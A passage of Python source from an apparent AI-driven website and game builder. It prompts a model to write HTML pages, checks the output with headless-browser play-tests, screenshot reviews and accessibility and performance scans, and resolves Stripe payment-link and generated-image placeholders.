""" + base_rules + extra_rules + lessons_block + """
Reply with ONLY the HTML, no markdown fences."""
    code = strip_fences(ask_ai(prompt))
    # Games get a review pass against game_dev_rules. Professional marketing
    # sites (not games, not teardowns) now get the same kind of pass against
    # design_rules — the first draft often "covers" the brief while still
    # shipping dead nav links, placeholder copy, or a layout that only works
    # at desktop width, which is exactly what a second pass catches.
    if is_game:
        code = strip_fences(_senior_review_pass(
            idea, code, game_dev_rules, "HTML5 browser game",
            "Reply with ONLY the complete, corrected HTML, no markdown fences and no commentary."
        ))
    elif not is_teardown:
        code = strip_fences(_senior_review_pass(
            idea, code, design_rules, "professional marketing website",
            "Reply with ONLY the complete, corrected HTML, no markdown fences and no commentary."
        ))
    if kvdb_bucket:
        code = inject_keyless_backend_library(code, kvdb_bucket, owner_email=os.environ.get("AGENT_EMAIL"))
    if firebase_config:
        code = inject_firebase_auth_library(code, firebase_config, owner_email=os.environ.get("AGENT_EMAIL"))
    write_file(WEB_CODE_FILE, code)
    return code

_PAGE_FILE_DELIM = re.compile(r"===FILE:\s*([a-zA-Z0-9_\-]+\.html)\s*===\s*\n(.*?)(?=(?:\n===FILE:)|\Z)", re.DOTALL)

def write_multipage_web(idea, previous_error="", kvdb_bucket=None, firebase_config=None, wants_payment=False, wants_file_upload=False):
    """
    Same builder as write_code_for_web, but for ideas that explicitly call
    for multiple linked pages. Asks the model to emit several complete HTML
    files in one response, delimited by '===FILE: name.html===' markers,
    then splits that into a {filename: html} dict. Every page shares the
    same design_rules bar and must link to the others by relative filename
    (about.html, contact.html, etc.) so navigation actually works once
    published side-by-side in the same tool folder.
    """
    lessons = load_lessons()
    lessons_block = (("\n\nLessons:\n" + lessons) if lessons else "") + design_system_hint()
    base_rules = """Each file must be ONE complete self-contained HTML document (own <html>/<head>/<body>, own <style>/<script>). All CSS in <style>, all JS in <script>. CDNs are fine. Pages must run immediately in a browser with no setup."""
    format_rules = """
Output MULTIPLE complete HTML files for this multi-page site. Format EXACTLY like this, with no other text before/after:
===FILE: index.html===
<!DOCTYPE html>...full page...
===FILE: about.html===
<!DOCTYPE html>...full page...
(repeat ===FILE: name.html=== for each page)
Requirements:
- Always name the homepage index.html.
- Every page must share the same header/nav and footer, and the nav on every page must link to the OTHER pages by their exact relative filename (e.g. href="about.html", href="contact.html") — these are real links between real files, not #anchors.
- Keep shared visual language (fonts, colors, spacing) identical across every page — it must read as one site, not several unrelated pages."""
    backend_block = BACKEND_RULES if kvdb_bucket else ""
    auth_block = AUTH_RULES if firebase_config else ""
    storage_block = STORAGE_RULES if (firebase_config and wants_file_upload) else ""
    payment_block = PAYMENT_RULES if wants_payment else ""
    notify_block = NOTIFY_RULES if ((kvdb_bucket or firebase_config) and os.environ.get("AGENT_EMAIL")) else ""
    if previous_error:
        prompt = "Build a multi-page website for: " + idea + "\nPrevious error: " + previous_error + "\nFix the ROOT CAUSE.\n" + base_rules + DESIGN_RULES + backend_block + auth_block + storage_block + payment_block + notify_block + format_rules + lessons_block
    else:
        prompt = "Build a multi-page website for: " + idea + "\n" + base_rules + DESIGN_RULES + backend_block + auth_block + storage_block + payment_block + notify_block + format_rules + lessons_block
    raw = strip_fences(ask_ai(prompt))
    matches = _PAGE_FILE_DELIM.findall(raw)
    pages = {}
    for filename, content in matches:
        pages[filename.strip()] = strip_fences(content.strip())
    if not pages:
        # Model ignored the multi-file format — fall back to treating the
        # whole response as a single index.html rather than failing outright.
        pages = {"index.html": raw}
    if "index.html" not in pages:
        # Promote whichever page came first so there's always a working
        # entry point at the folder root.
        first_key = next(iter(pages))
        pages["index.html"] = pages.pop(first_key)
    if kvdb_bucket:
        pages = {fname: inject_keyless_backend_library(html, kvdb_bucket, owner_email=os.environ.get("AGENT_EMAIL")) for fname, html in pages.items()}
    if firebase_config:
        pages = {fname: inject_firebase_auth_library(html, firebase_config, owner_email=os.environ.get("AGENT_EMAIL")) for fname, html in pages.items()}
    return pages

def _strip_script_and_style_blocks(html_code):
    no_scripts = re.sub(r"(<script\b[^>]*>)(.*?)(</script\s*>)", lambda m: m.group(1) + m.group(3), html_code, flags=re.IGNORECASE | re.DOTALL)
    return re.sub(r"(<style\b[^>]*>)(.*?)(</style\s*>)", lambda m: m.group(1) + m.group(3), no_scripts, flags=re.IGNORECASE | re.DOTALL)

_ANCHOR_HREF_RE = re.compile(r'href\s*=\s*["\']#([a-zA-Z0-9_\-]+)["\']')
_ID_ATTR_RE = re.compile(r'\bid\s*=\s*["\']([a-zA-Z0-9_\-]+)["\']')
_NAME_ATTR_RE = re.compile(r'\bname\s*=\s*["\']([a-zA-Z0-9_\-]+)["\']')

def _find_broken_anchor_links(html_code):
    """
    Cheap regex check (no AI call) for the most common dead-nav-link bug:
    a <a href="#pricing"> with no matching id="pricing" (or legacy
    name="pricing") anywhere on the page. DESIGN_RULES explicitly requires
    real working #anchor links, but nothing previously verified the writer
    model actually followed that — this catches it for free alongside the
    other structural checks. href="#" itself (a common lazy placeholder)
    is also flagged since it goes nowhere.
    """
    hrefs = _ANCHOR_HREF_RE.findall(html_code)
    bare_hash = bool(re.search(r'href\s*=\s*["\']#["\']', html_code))
    if not hrefs and not bare_hash:
        return []
    available_ids = set(_ID_ATTR_RE.findall(html_code)) | set(_NAME_ATTR_RE.findall(html_code))
    broken = ["#" + h for h in hrefs if h not in available_ids]
    if bare_hash:
        broken.append("#")
    # de-dupe while keeping order
    seen = set()
    result = []
    for b in broken:
        if b not in seen:
            seen.add(b)
            result.append(b)
    return result

def check_web_output_structural(html_code, require_3d=False, require_game=False, require_professional_site=False):
    problems = []
    lower = html_code.lower()
    if "<html" not in lower:
        problems.append("Missing <html> tag.")
    if "<script" not in lower:
        problems.append("No <script> tag found.")
    skeleton = _strip_script_and_style_blocks(html_code)
    if skeleton.count("<") != skeleton.count(">"):
        problems.append("Unbalanced angle brackets.")
    script_match = re.findall(r"<script\b[^>]*>(.*?)</script\s*>", html_code, flags=re.IGNORECASE | re.DOTALL)
    for sc in script_match:
        if abs(sc.count("{") - sc.count("}")) > 2:
            problems.append("Large brace imbalance in script block.")
    if require_3d:
        if "three.min.js" not in lower and "three.module.js" not in lower and "<canvas" not in lower:
            problems.append("Idea calls for a 3D scene but no Three.js/<canvas> usage was found.")
    if require_game:
        if "<canvas" not in lower:
            problems.append("This is a game but no <canvas> element was found.")
        if "requestanimationframe" not in lower:
            problems.append("This is a game but no requestAnimationFrame game loop was found.")
        if "addeventlistener" not in lower and "onkeydown" not in lower and "onkeyup" not in lower:
            problems.append("This is a game but no input handling (keyboard/touch event listeners) was found.")
        if "localstorage" not in lower:
            problems.append("This is a game but no localStorage high-score persistence was found.")
        if "audiocontext" not in lower and "webkitaudiocontext" not in lower:
            problems.append("This is a game but no Web Audio API usage was found — professional games need audible feedback, not silence.")
        if "game_over" not in lower and "gameover" not in lower and "game over" not in lower:
            problems.append("This is a game but no game-over state/screen was found.")
    if require_professional_site:
        if "name=\"viewport\"" not in lower and "name='viewport'" not in lower:
            problems.append("No <meta name=\"viewport\"> tag — page won't be usable on mobile.")
        title_match = re.search(r"<title>(.*?)</title>", html_code, flags=re.IGNORECASE | re.DOTALL)
        if not title_match or not title_match.group(1).strip() or title_match.group(1).strip().lower() in ("document", "my site", "untitled"):
            problems.append("Missing or generic <title> tag — must be specific to the site's actual subject.")
        if "name=\"description\"" not in lower and "name='description'" not in lower:
            problems.append("No <meta name=\"description\"> tag for SEO.")
        if not any(t in lower for t in ["<header", "<nav", "<main", "<section", "<footer"]):
            problems.append("No semantic HTML5 structure found (header/nav/main/section/footer) — likely an all-<div> layout.")
        if "@media" not in lower and "clamp(" not in lower and "min(" not in lower:
            problems.append("No responsive technique found (@media query or clamp()/min()) — layout likely breaks on mobile widths.")
        if "lorem ipsum" in lower or "your text here" in lower or "placeholder text" in lower:
            problems.append("Placeholder/lorem-ipsum copy found — all copy must be real, finished content.")
        img_tags = re.findall(r"<img\b[^>]*>", html_code, flags=re.IGNORECASE)
        imgs_missing_alt = [t for t in img_tags if not re.search(r"alt\s*=\s*[\"'][^\"']+[\"']", t, flags=re.IGNORECASE)]
        if imgs_missing_alt:
            problems.append(str(len(imgs_missing_alt)) + " <img> tag(s) missing a real alt attribute.")
        broken_anchors = _find_broken_anchor_links(html_code)
        if broken_anchors:
            problems.append(
                str(len(broken_anchors)) + " nav link(s) point to a section that doesn't exist: "
                + ", ".join(broken_anchors[:5]) + " — DESIGN_RULES requires real working #anchor links, not dead ones."
            )
    if not problems:
        return True, "Structurally OK."
    return False, "; ".join(problems)

def _genimage_placeholders_for_preview(html_code):
    """
    Swaps genimage: prompts for cheap picsum.photos stand-ins, purely so
    the headless-browser QA/play-test steps (check_web_output,
    play_test_web_output) have a loadable image URL and don't log a
    failed-resource console error for what is, at that point, still just
    a placeholder tag. The real Gemini generation happens exactly once,
    at push time, in resolve_genimage_placeholders() — doing it here too
    would burn an image-generation call on every retry attempt, including
    attempts that fail other checks and get thrown away.
    """
    def _sub(m):
        prompt = m.group(2).strip()
        return "src=" + m.group(1) + "https://picsum.photos/seed/" + _slugify_for_placeholder(prompt) + "/1600/900" + m.group(1)
    return _GENIMAGE_SRC_RE.sub(_sub, html_code)

def check_web_output(html_code, require_3d=False, require_game=False, require_professional_site=False):
    if not playwright_is_available():
        return check_web_output_structural(html_code, require_3d=require_3d, require_game=require_game, require_professional_site=require_professional_site)
    from playwright.sync_api import sync_playwright
    temp_path = os.path.abspath("generated_web.html")
    write_file(temp_path, _genimage_placeholders_for_preview(html_code))
    console_errors = []
    try:
        with sync_playwright() as p:
            # Same fix as playwright_is_available() above: use the system/
            # Nix-provided Chromium if present, instead of only looking for
            # Playwright's own bundled download.
            browser = p.chromium.launch(
                executable_path=_find_nix_chromium(),
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]
            )
            page = browser.new_page()
            page.on("console", lambda msg: console_errors.append(msg.text) if msg.type == "error" else None)
            page.on("pageerror", lambda exc: console_errors.append(str(exc)))
            try:
                page.goto("file://" + temp_path, timeout=8000)
                # 3D/WebGL scenes (Three.js, GSAP) and games (canvas init,
                # first animation frames, audio context setup) need more
                # time to initialize and render than a static page, so wait
                # longer before checking for console errors.
                page.wait_for_timeout(4000 if (require_3d or require_game) else 2000)
                if require_game:
                    # Exercise real input so listener bugs (e.g. a keydown
                    # handler that throws) surface as console errors here
                    # instead of only in a real player's browser.
                    try:
                        page.keyboard.press("ArrowRight")
                        page.keyboard.press("ArrowUp")
                        page.mouse.click(50, 50)
                        page.wait_for_timeout(500)
                    except Exception:
                        pass
                if require_professional_site:
                    # Resize to a phone viewport and re-check for layout
                    # blowouts (horizontal scroll) — the most common way a
                    # "responsive" page fails in practice.
                    try:
                        page.set_viewport_size({"width": 390, "height": 844})
                        page.wait_for_timeout(300)
                        overflow_x = page.evaluate("document.documentElement.scrollWidth > document.documentElement.clientWidth + 10")
                        if overflow_x:
                            console_errors.append("Horizontal overflow detected at mobile width (390px) — layout is not actually responsive.")
                    except Exception:
                        pass
            except Exception as e:
                console_errors.append("Page failed to load: " + str(e))
            browser.close()
    except Exception:
        return check_web_output_structural(html_code, require_3d=require_3d, require_game=require_game, require_professional_site=require_professional_site)
    if console_errors:
        return False, "Browser errors:\n" + "\n".join(console_errors[:10])
    if require_3d or require_game or require_professional_site:
        structural_ok, structural_msg = check_web_output_structural(html_code, require_3d=require_3d, require_game=require_game, require_professional_site=require_professional_site)
        if not structural_ok:
            return False, structural_msg
    return True, "Loaded successfully with no console errors."

def _canvas_pixel_stats(screenshot_bytes):
    """
    Rough 'did anything actually render' check on a screenshot. Uses PIL if
    it's available; if not, returns an "unknown" result rather than failing
    a build over a missing optional dependency.
    """
    try:
        from PIL import Image
    except ImportError:
        return None, None
    try:
        img = Image.open(io.BytesIO(screenshot_bytes)).convert("L")
        pixels = list(img.getdata())
        if not pixels:
            return True, 0
        avg = sum(pixels) / len(pixels)
        variance = sum((p - avg) ** 2 for p in pixels) / len(pixels)
        # Near-zero variance means the frame is one flat color end to end —
        # either genuinely blank or a static, non-updating scene.
        is_blank = variance < 5
        return is_blank, avg
    except Exception:
        return None, None


def play_test_web_output(html_code, idea, wants_game=True):
    """
    The 'tester agent' half of the builder/tester loop. Actually launches
    the generated game in a headless browser, plays it with a short
    realistic input script (not a single tap), grabs screenshots mid-play,
    and checks whether the canvas is visibly changing and whether audio
    ever actually started — the kind of things a human playtester notices
    in the first ten seconds that a console-error check alone will miss.

    Returns (passed, report) where report is a dict with an "issues" list.
    Infra problems (missing Playwright, browser launch failure) never fail
    the build themselves — they're reported but treated as a pass, since
    they're environment problems, not problems with the generated game.
    """
    report = {"issues": [], "screenshots_taken": 0}
    if not playwright_is_available():
        report["issues"].append(
            "Playwright not available — skipped real play-test, only structural checks applied."
        )
        return True, report

    from playwright.sync_api import sync_playwright
    temp_path = os.path.abspath("play_test.html")
    write_file(temp_path, _genimage_placeholders_for_preview(html_code))
    console_errors = []
    screenshots = []
    audio_state = "unknown"

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                executable_path=_find_nix_chromium(),
                args=[
                    "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
                    "--autoplay-policy=no-user-gesture-required",
                ],
            )
            page = browser.new_page(viewport={"width": 1024, "height": 768})
            page.on("console", lambda msg: console_errors.append(msg.text) if msg.type == "error" else None)
            page.on("pageerror", lambda exc: console_errors.append(str(exc)))
            try:
                page.goto("file://" + temp_path, timeout=8000)
                page.wait_for_timeout(1500)
                try:
                    page.mouse.click(512, 384)  # focus canvas, satisfy audio-gesture requirements
                except Exception:
                    pass

                # A real play session: alternating movement/jump/interact
                # keys with pauses between, instead of one isolated keypress.
                key_script = ["ArrowUp", "ArrowRight", "ArrowRight", "Space", "ArrowLeft", "ArrowDown", "Space"]
                for i, key in enumerate(key_script):
                    try:
                        page.keyboard.press(key)
                    except Exception:
                        pass
                    page.wait_for_timeout(400)
                    if i in (1, 4, 6):
                        try:
                            screenshots.append(page.screenshot())
                            report["screenshots_taken"] += 1
                        except Exception:
                            pass

                try:
                    audio_state = page.evaluate("""
                        () => {
                            for (const key in window) {
                                try {
                                    if (window[key] instanceof (window.AudioContext || window.webkitAudioContext)) {
                                        return window[key].state;
                                    }
                                } catch (e) {}
                            }
                            return "not_found";
                        }
                    """)
                except Exception:
                    audio_state = "unknown"
            except Exception as e:
                console_errors.append("Page failed to load during play-test: " + str(e))
            browser.close()
    except Exception as e:
        report["issues"].append("Could not run play-test (environment issue): " + str(e))
        return True, report

    if console_errors:
        report["issues"].append("Errors during play session: " + "; ".join(console_errors[:5]))

    if wants_game:
        if audio_state == "not_found":
            report["issues"].append("No AudioContext ever created — the game is silent even after simulated input.")
        elif audio_state == "suspended":
            report["issues"].append("AudioContext exists but never resumed — sound will stay silent for real players too.")

    blank_results = [_canvas_pixel_stats(s)[0] for s in screenshots]
    checked = [b for b in blank_results if b is not None]
    if checked and all(checked):
        report["issues"].append("Canvas looks blank/static across the whole play session — nothing appears to be rendering or changing.")

    passed = len(report["issues"]) == 0
    return passed, report


ENV_QUALITY_KEYWORDS = {
    "wind_visual": ["wind", "sway", "windstrength", "winddir"],
    "wind_audio": ["wind", "noise", "howl"],
    "footstep_audio": ["footstep", "step_sound", "walksound", "footfall"],
    "water": ["water", "reflect", "refract", "wave"],
}

def check_environment_quality(html_code, idea):
    """
    A step past 'does it run': does the environment look/sound like more
    than a flat placeholder? Only kicks in when the idea itself calls for
    an outdoor/natural scene (forest, mountain, water, wind). Checks for
    the presence of the specific techniques that separate a real
    environment from a colored plane — a wind/sway variable driving
    foliage, a water shader, footstep/wind audio — instead of total
    silence and static geometry. This is a keyword heuristic, not a visual
    judgment: it exists mainly to catch the common failure where an LLM
    *describes* wind or water in a comment but never actually implements it.
    """
    lower = html_code.lower()
    idea_lower = idea.lower()
    wants_env = any(w in idea_lower for w in
                    ["forest", "mountain", "outdoor", "wind", "water", "lake", "river", "nature", "trees"])
    if not wants_env:
        return True, []
    issues = []
    if "forest" in idea_lower or "tree" in idea_lower or "wind" in idea_lower:
        if not any(k in lower for k in ENV_QUALITY_KEYWORDS["wind_visual"]):
            issues.append("Idea calls for trees/wind but no wind/sway variable found — foliage is likely static.")
    if "wind" in idea_lower:
        if not any(k in lower for k in ENV_QUALITY_KEYWORDS["wind_audio"]):
            issues.append("Idea calls for wind but no wind sound/noise reference found in the audio code.")
    if "walk" in idea_lower or "run" in idea_lower or "player" in idea_lower or "forest" in idea_lower:
        if not any(k in lower for k in ENV_QUALITY_KEYWORDS["footstep_audio"]):
            issues.append("No footstep sound logic found — player movement will be silent.")
    if "water" in idea_lower or "lake" in idea_lower or "river" in idea_lower:
        if not any(k in lower for k in ENV_QUALITY_KEYWORDS["water"]):
            issues.append("Idea calls for water but no reflection/wave/refraction shader logic found — likely a flat colored plane.")
    return len(issues) == 0, issues


def check_copy_quality(html_code, idea):
    """
    An AI-judged pass on the page's actual visible text — separate from the
    'is there literal lorem ipsum' regex check in check_web_output_structural.
    Regex can only catch the laziest placeholder text; it can't tell real,
    specific copy from generic-but-grammatical filler ("We provide quality
    solutions for all your needs"). This asks the model to read the copy
    like a skeptical client would and call out anything that reads as
    templated or content-free.
    """
    text_only = re.sub(r"<script\b[^>]*>.*?</script\s*>", " ", html_code, flags=re.IGNORECASE | re.DOTALL)
    text_only = re.sub(r"<style\b[^>]*>.*?</style\s*>", " ", text_only, flags=re.IGNORECASE | re.DOTALL)
    text_only = re.sub(r"<[^>]+>", " ", text_only)
    text_only = re.sub(r"\s+", " ", text_only).strip()
    if len(text_only) < 40:
        return True, []  # not enough visible text to meaningfully judge
    prompt = """You're a skeptical client reviewing website copy for: """ + idea + """

Visible page text:
\"\"\"""" + text_only[:4000] + """\"\"\"

Does this copy sound real, specific, and written for THIS idea — or does it read as generic filler that could paste onto any site ("quality service," "we care about our customers," vague claims with no specifics)? Also flag any headline/CTA that's confusing or doesn't match the idea.
If it's genuinely fine, reply with exactly: OK
Otherwise reply with up to 3 short bullet points (one line each, no preamble), each naming a specific weak phrase or section."""
    result = ask_ai(prompt).strip()
    if result.upper().startswith("OK") and len(result) < 6:
        return True, []
    issues = [line.strip("-• ").strip() for line in result.splitlines() if line.strip() and line.strip().upper() != "OK"]
    return len(issues) == 0, issues[:3]


def check_design_quality(html_code, idea):
    """
    An AI-judged read of the page's actual CSS/structure — the closest
    proxy this agent can offer to 'does this look professional', since the
    underlying model (gpt-oss-120b via Cerebras) is text-only and can't see
    a screenshot. This is a real second opinion on the code, not a verdict
    on rendered pixels — flag that distinction rather than overclaiming
    what it caught.
    """
    style_blocks = re.findall(r"<style\b[^>]*>(.*?)</style\s*>", html_code, flags=re.IGNORECASE | re.DOTALL)
    css = "\n".join(style_blocks)[:4000]
    if not css.strip():
        return False, ["No <style> block / CSS found at all — page has no real visual design."]
    head_match = re.search(r"<head\b[^>]*>(.*?)</head\s*>", html_code, flags=re.IGNORECASE | re.DOTALL)
    head = head_match.group(1)[:1500] if head_match else ""
    prompt = """You're a senior designer doing a code review (not a visual review — you're reading the CSS/HTML, not seeing a screenshot) of a site built for: """ + idea + """

<head> excerpt:
""" + head + """

CSS:
""" + css + """

Based on the actual CSS values used (colors, fonts, spacing), does this look like it was designed with real intent — a real color palette, real font choices, deliberate spacing — or does it look like default/templated styling (default blue links, Arial/system fonts only, no custom color variables, no real spacing rhythm)?
If it looks genuinely designed, reply with exactly: OK
Otherwise reply with up to 3 short bullet points (one line each, no preamble) naming the specific generic pattern found."""
    result = ask_ai(prompt).strip()
    if result.upper().startswith("OK") and len(result) < 6:
        return True, []
    issues = [line.strip("-• ").strip() for line in result.splitlines() if line.strip() and line.strip().upper() != "OK"]
    return len(issues) == 0, issues[:3]


def capture_site_screenshots(html_code):
    """
    Renders the page once in headless Chromium and returns
    {"desktop": png_bytes, "mobile": png_bytes} (either key may be missing
    if that particular capture failed). Reuses one browser session for
    both shots rather than launching twice. Reuses the same genimage: ->
    picsum swap as the other QA passes so a screenshot isn't full of
    broken-image icons for a page that hasn't been pushed (and therefore
    hadn't had its real images generated) yet.
    """
    if not playwright_is_available():
        return {}
    from playwright.sync_api import sync_playwright
    temp_path = os.path.abspath("visual_qa.html")
    write_file(temp_path, _genimage_placeholders_for_preview(html_code))
    shots = {}
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                executable_path=_find_nix_chromium(),
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]
            )
            page = browser.new_page(viewport={"width": 1440, "height": 900})
            page.goto("file://" + temp_path, timeout=8000)
            page.wait_for_timeout(2500)  # let fonts/animations/GSAP reveals settle
            try:
                shots["desktop"] = page.screenshot(full_page=True)
            except Exception:
                pass
            try:
                page.set_viewport_size({"width": 390, "height": 844})
                page.wait_for_timeout(500)  # let responsive layout/reflow settle
                shots["mobile"] = page.screenshot(full_page=True)
            except Exception:
                pass
            browser.close()
    except Exception:
        return shots
    return shots

def check_visual_design_quality(html_code, idea):
    """
    The real answer to 'does this look professional' — check_design_quality
    only reads CSS as text and can't catch things that are only visible
    once rendered (overlapping elements, illegible text-on-image contrast,
    a broken grid, huge dead whitespace, a cramped/broken mobile layout).
    This takes actual desktop AND mobile screenshots — most real traffic
    to a small site is mobile, and check_web_output's overflow check only
    catches horizontal scroll, not a nav that's technically not overflowing
    but still cramped or unreadable — and has Gemini's vision model look
    at both together in a single call, like a client reviewing on their
    laptop and then their phone.
    Infra failures (no Playwright, no GEMINI_API_KEY, a failed render) are
    never treated as a design failure — they just skip this specific check
    so a build never fails over an environment hiccup rather than a real
    visual problem.
    """
    shots = capture_site_screenshots(html_code)
    if not shots or not GEMINI_API_KEY:
        return True, []
    images = []
    labels = []
    if "desktop" in shots:
        images.append((shots["desktop"], "image/png"))
        labels.append("Screenshot " + str(len(images)) + " is the DESKTOP view (1440px wide).")
    if "mobile" in shots:
        images.append((shots["mobile"], "image/png"))
        labels.append("Screenshot " + str(len(images)) + " is the MOBILE view (390px wide).")
    if not images:
        return True, []
    prompt = ("""You're a senior visual designer reviewing screenshot(s) of a website built for: """ + idea + """

""" + "\n".join(labels) + """

Look at the actual screenshot(s) and flag only things a real visitor would notice as broken or unpolished, on either screen size:
- overlapping or cut-off text/elements
- illegible text (low contrast, text sitting on a background with no contrast)
- large empty gaps or an obviously misaligned/broken grid
- a layout that looks like default/unstyled HTML
- broken image icons
- on the mobile screenshot specifically: cramped nav, text touching the screen edge, tap targets crowded together, or a hero/image that crops badly

Don't flag subjective taste (colors you personally wouldn't have picked, etc) — only genuine visual bugs a paying client would ask to have fixed.
If both screenshots look clean and professional, reply with exactly: OK
Otherwise reply with up to 3 short bullet points (one line each, no preamble), each naming the specific visual problem and which screen size it's on.""")
    result = ask_gemini_vision(images, prompt).strip()
    if result.startswith("ERROR"):
        return True, []
    if result.upper().startswith("OK") and len(result) < 6:
        return True, []
    issues = [line.strip("-• ").strip() for line in result.splitlines() if line.strip() and line.strip().upper() != "OK"]
    return len(issues) == 0, issues[:3]


def check_accessibility(html_code):
    """
    Real WCAG violation scan via axe-core (the industry-standard a11y
    engine — same one Lighthouse/Chrome DevTools use under the hood),
    replacing what was previously just a heuristic (alt-attribute
    presence only) with an actual ruleset covering color contrast, ARIA
    misuse, missing form labels, landmark structure, etc. Loads the page
    in headless Chromium, injects axe-core from CDN, runs it in-page.
    Only "serious"/"critical" impact violations fail the build — moderate/
    minor nits shouldn't block shipping the way a broken layout should.
    Infra failures (no Playwright, axe failing to load) skip the check
    rather than failing the build, same fail-safe pattern as the other
    browser-based QA passes.
    """
    if not playwright_is_available():
        return True, []
    from playwright.sync_api import sync_playwright
    temp_path = os.path.abspath("a11y_qa.html")
    write_file(temp_path, _genimage_placeholders_for_preview(html_code))
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                executable_path=_find_nix_chromium(),
                args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]
            )
            page = browser.new_page(viewport={"width": 1440, "height": 900})
            page.goto("file://" + temp_path, timeout=8000)
            page.wait_for_timeout(1500)
            page.add_script_tag(url="https://cdnjs.cloudflare.com/ajax/libs/axe-core/4.9.1/axe.min.js")
            violations = page.evaluate("""
                async () => {
                    const r = await axe.run(document, {resultTypes: ['violations']});
                    return r.violations.map(v => ({id: v.id, impact: v.impact, help: v.help, nodes: v.nodes.length}));
                }
            """)
            browser.close()
    except Exception:
        return True, []
    serious = [v for v in (violations or []) if v.get("impact") in ("serious", "critical")]
    if not serious:
        return True, []
    issues = [v["help"] + " (" + str(v["impact"]) + ", " + str(v["nodes"]) + " element(s))" for v in serious[:3]]
    return False, issues


def check_web_performance(html_code, page=None):
    """
    A lightweight, honest stand-in for a real Lighthouse audit. This agent
    doesn't have the Lighthouse CLI wired in (would need an extra Node
    dependency + its own availability check like Playwright gets), so this
    checks the things that matter most for a single-file HTML tool without
    that dependency: total page weight, whether scripts block initial
    render, and — when a live Playwright `page` is passed in — actual
    navigation timing from the browser itself.
    """
    issues = []
    size_kb = len(html_code.encode("utf-8")) / 1024.0
    if size_kb > 600:
        issues.append("Page is " + str(round(size_kb)) + "KB — likely has large inline assets (base64 images/audio) that should be external or lighter.")
    blocking_scripts = re.findall(r"<script\b(?![^>]*\b(defer|async|type=[\"']module[\"'])\b)[^>]*\bsrc=[^>]*>", html_code, flags=re.IGNORECASE)
    if len(blocking_scripts) > 2:
        issues.append(str(len(blocking_scripts)) + " external <script src> tags without defer/async — these block initial render.")
    if page is not None:
        try:
            timing = page.evaluate("""
                () => {
                    const nav = performance.getEntriesByType('navigation')[0];
                    return nav ? { load: nav.loadEventEnd, dcl: nav.domContentLoadedEventEnd } : null;
                }
            """)
            if timing and timing.get("load", 0) > 4000:
                issues.append("Real browser load time was " + str(round(timing["load"])) + "ms — slow for a single-file site.")
        except Exception:
            pass
    return len(issues) == 0, issues


_GENIMAGE_SRC_RE = re.compile(r'src=(["\'])\s*genimage:\s*(.*?)\1', re.IGNORECASE | re.DOTALL)
_STRIPE_HREF_RE = re.compile(r'href=(["\'])\s*STRIPE_LINK:\s*(.*?)\1', re.IGNORECASE | re.DOTALL)

STRIPE_LINKS_FILE = workpath("stripe_links.json")

def load_stripe_links():
    return read_json_file(STRIPE_LINKS_FILE, {})

def save_stripe_link(product_key, url):
    links = load_stripe_links()
    links[product_key.strip()] = url.strip()
    write_file(STRIPE_LINKS_FILE, json.dumps(links, indent=2))

PAYMENT_RULES = """
This site sells something real — a product, service, ticket, or donation. Real checkout needs an actual Stripe Payment Link (created once, free, in the Stripe dashboard) — there is no way to generate a working payment button from code alone, so instead: for each distinct thing being sold, add a real "Buy"/"Pay"/"Donate" <a> link with href="STRIPE_LINK: a short, specific product-key describing exactly this item (e.g. STRIPE_LINK: premium-plan-monthly)" — one placeholder per distinct product/price, not one generic one for the whole page if there are multiple things being sold. These get resolved to the real Stripe checkout URL automatically before the site ships (or a "contact us to purchase" mailto if no link has been registered yet for that key) — don't add your own checkout logic or mention Stripe/payment-processing in the on-page copy."""

def resolve_stripe_placeholders(html_code, owner_email=None):
    """
    Finds <a href="STRIPE_LINK: <product-key>"> placeholders left by the
    website builder (see PAYMENT_RULES) and swaps them for a real,
    already-registered Stripe Payment Link (see 'addstripelink:' console
    command) matched by product-key. Stripe Payment Links can't be
    created from code without a real Stripe account + API key — this
    stays free/keyless by having the USER create the link once in their
    own free Stripe dashboard and register it, rather than the agent
    trying to spend money or hold payment credentials. Any key with no
    registered link falls back to a mailto: so the button still does
    something useful (contact the owner to buy) instead of being dead.
    """
    matches = _STRIPE_HREF_RE.findall(html_code)
    if not matches:
        return html_code, []
    links = load_stripe_links()
    notes = []

    def _sub(m):
        key = m.group(2).strip()
        if key in links:
            return 'href="' + links[key] + '"'
        notes.append("No Stripe link registered for '" + key + "' — falling back to a contact mailto. Register with: addstripelink: " + key + " | https://buy.stripe.com/...")
        if owner_email:
            return 'href="mailto:' + owner_email + '?subject=Interested%20in%20' + key.replace(" ", "%20") + '"'
        return 'href="#"'

    return _STRIPE_HREF_RE.sub(_sub, html_code), notes



def _slugify_for_placeholder(text, max_len=40):
    slug = re.sub(r"[^a-z0-9]+", "-", text.lower()).strip("-")
    return (slug[:max_len].strip("-")) or "placeholder"

def _convert_to_webp(image_bytes):
    """
    Converts generated image bytes to WebP via Pillow — WebP typically
    runs 25-35% smaller than PNG/JPEG at equivalent visual quality, which
    directly addresses the "page is heavy" flag check_web_performance
    already raises but nothing previously fixed. Only used for regular
    content images (genimage: results), not the brand icon/OG card —
    those need broad platform compatibility (some social-preview crawlers
    and older Safari touch-icon handling don't reliably support WebP).
    Falls back to (None, None) if Pillow isn't available or conversion
    fails for any reason, so this can never block an image from shipping.
    """
    try:
        from PIL import Image
        img = Image.open(io.BytesIO(image_bytes)).convert("RGB")
        out = io.BytesIO()
        img.save(out, format="WEBP", quality=85, method=6)
        return out.getvalue(), "webp"
    except Exception:
        return None, None

def resolve_genimage_placeholders(html_code, tool_folder_name, image_index_start=0):
    """
    Finds <img src="genimage: <prompt>"> tags left by the website builder
    (see DESIGN_RULES), generates each distinct prompt with Gemini's image
    model, pushes the resulting bytes to GitHub under
    <tool_folder_name>/images/, and rewrites the src to the real raw
    GitHub URL. Any image that fails to generate (no GEMINI_API_KEY,
    rate-limited, blocked, etc.) falls back to a picsum.photos placeholder
    in the same slot so a Gemini outage never blocks the whole site from
    shipping. Returns (new_html, notes, next_image_index) — notes is a
    list of human-readable strings for logging, next_image_index lets
    callers keep numbering unique across multiple pages of one site.
    """
    matches = _GENIMAGE_SRC_RE.findall(html_code)
    if not matches:
        return html_code, [], image_index_start
    notes = []
    replacements = {}
    idx = image_index_start
    for _quote, raw_prompt in matches:
        prompt = raw_prompt.strip()
